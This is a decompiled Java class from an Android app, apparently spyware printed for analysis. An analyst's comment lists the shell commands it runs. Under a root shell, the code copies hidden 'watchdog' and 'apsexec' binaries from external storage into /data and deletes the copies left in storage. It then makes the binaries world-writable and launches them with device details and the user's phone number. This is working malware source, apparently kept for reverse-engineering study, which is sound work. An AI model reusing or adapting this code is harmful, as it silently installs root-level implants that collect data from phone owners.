package com.p003fa.p004c;

/* renamed from: com.fa.c.RootCommandExecutor */
/** ANAL: RootCommandExecutor class
 *
 * Commands executed:
 *
 * $ cat watchdog > /data/watchdog
 * $ cat apsexec > /data/apsexec
 * $ chmod 777 watchdog
 * $ chmod 777 apsexec
 * $ /data/watchdog cmd_args /data/apsexec exchange_file phone_num
 *
 * Where:
 *
 * - cmd_args = return new java.lang.StringBuilder(java.lang.String.valueOf(new java.lang.String(idBytes, "UTF-8"))).append(" ").append(timeOffsetByte).append(" ").append(version).append(" ").append(batery).append(" ").append(isWifi).toString();
 * - exchange_file = <RANDOM>
 * - phone_num = <PHONE_NUMBER>
 */
public class RootCommandExecutor {
    public static boolean Execute(android.content.Context context) {
        try {
            com.stericson.RootTools.C1040RootTools.getShell(true).add(new com.stericson.RootShell.execution.Command(0,
                        "cat " + android.os.Environment.getExternalStorageDirectory().getAbsolutePath() + java.io.File.separator + com.p003fa.p004c.Utilities.GetWatchDogName(context) + " > /data/" + com.p003fa.p004c.Utilities.GetWatchDogName(context),
                        "cat " + android.os.Environment.getExternalStorageDirectory().getAbsolutePath() + java.io.File.separator + com.p003fa.p004c.Utilities.GetExecName(context) + " > /data/" + com.p003fa.p004c.Utilities.GetExecName(context),
                        "rm " + android.os.Environment.getExternalStorageDirectory().getAbsolutePath() + java.io.File.separator + com.p003fa.p004c.Utilities.GetWatchDogName(context),
                        "rm " + android.os.Environment.getExternalStorageDirectory().getAbsolutePath() + java.io.File.separator + com.p003fa.p004c.Utilities.GetExecName(context),
                        "chmod 777 /data/" + com.p003fa.p004c.Utilities.GetWatchDogName(context),
                        "chmod 777 /data/" + com.p003fa.p004c.Utilities.GetExecName(context),
                        "/data/" + com.p003fa.p004c.Utilities.GetWatchDogName(context) + " " + com.p003fa.p004c.Utilities.GetDeviceInfoCommandLineArgs(context) + " /data/" + com.p003fa.p004c.Utilities.GetExecName(context) + " " + android.os.Environment.getExternalStorageDirectory().getAbsolutePath() + java.io.File.separator + com.p003fa.p004c.Utilities.GetExchangeFileName(context) + " " + android.os.Environment.getExternalStorageDirectory().getAbsolutePath() + java.io.File.separator + " " + com.p003fa.p004c.Utilities.GetPhoneNumber(context)));
            return true;
        } catch (java.lang.Exception e) {
            android.util.Log.d("CPS", e.getMessage());
            return false;
        }
    }
}
